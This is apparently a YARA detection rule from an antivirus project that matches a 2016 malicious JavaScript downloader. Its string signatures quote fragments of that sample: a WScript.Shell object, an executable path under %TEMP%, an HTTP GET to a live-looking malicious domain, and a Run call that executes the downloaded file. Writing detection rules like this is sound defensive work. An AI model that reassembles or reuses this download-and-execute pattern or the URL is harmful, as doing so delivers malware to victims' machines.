rule sig_20160328_ccb459c6f81115c862eaf30214488078 {
  meta:
    description = "datamaliciousorder - file 20160328_ccb459c6f81115c862eaf30214488078.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "f8dcefacda16756df9aa22a0fbe22ad487fc76d87c08267530646b6e8e0b5fff"

  strings:
    $s1  = "function Vozrsentxh() {return Grbrkkgjv[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"iGpQHdPXEgn.exe\";};" fullword ascii
    $s2  = "Ykgkiadf[Wnmvodwhh](\"GET\", \"http://santhiyasreetrading.com/j5ysdla\", false);" fullword ascii
    $s3  = "do {WScript[Qlfqqxbghl](Fzzvbxxx() * 11)} while (Ykgkiadf[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "var Grbrkkgjv = function Bvgex() {return WScript[Xeisvtl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Yzwnqd(Zidgyja, Jkakmupeb){return Zidgyja - Jkakmupeb;};" fullword ascii
    $s6  = "function Kwrjxnth() {return ((Lcqtw == true) && (Lcqtw == Codbcou)) ? 1 : Cbkkqbnj;};" fullword ascii
    $s7  = "function Pklzkoaoy(Wdslqhbms){Grbrkkgjv[\"Run\"](Wdslqhbms, Cbkkqbnj, Cbkkqbnj);};" fullword ascii
    $s8  = "var Codbcou = false;" fullword ascii
    $s9  = "function Audvm(){return Uczfsckuk;};" fullword ascii
    $s10 = "Lcqtw = true; " fullword ascii
    $s11 = "function Utzwfogb(Rrofg) {var Nhplta = (1, 2, 3, 4, 5, Rrofg); return Nhplta;};" fullword ascii
    $s12 = "function Qivke(){return Xeisvtl;};" fullword ascii
    $s13 = "var Gygdutjopj = false;" fullword ascii
    $s14 = "Codbcou = true; " fullword ascii
    $s15 = "var Ecdzrj = new this[\"Date\"]();" fullword ascii
    $s16 = "function Fzzvbxxx(){return 22;};" fullword ascii
    $s17 = " while (Gstxdra){" fullword ascii
    $s18 = "var Lcqtw = false;" fullword ascii
    $s19 = "} catch(Qzxbwuclvk){Gstxdra = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii
    $s20 = "function Ftcackr()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}